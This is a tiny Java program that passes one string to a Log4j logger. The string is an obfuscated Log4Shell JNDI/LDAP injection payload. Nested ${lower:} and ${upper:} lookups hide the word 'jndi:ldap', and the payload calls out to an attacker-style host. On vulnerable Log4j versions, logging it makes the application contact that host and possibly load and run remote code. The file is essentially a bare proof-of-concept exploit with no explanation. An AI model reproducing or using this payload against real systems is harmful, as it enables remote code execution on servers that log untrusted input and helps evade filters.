import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        logger.error("${${lower:j}ndi:${lower:l}${upper:d}a${upper:p}://somesitehackerofhell.com/z}");
    }
}
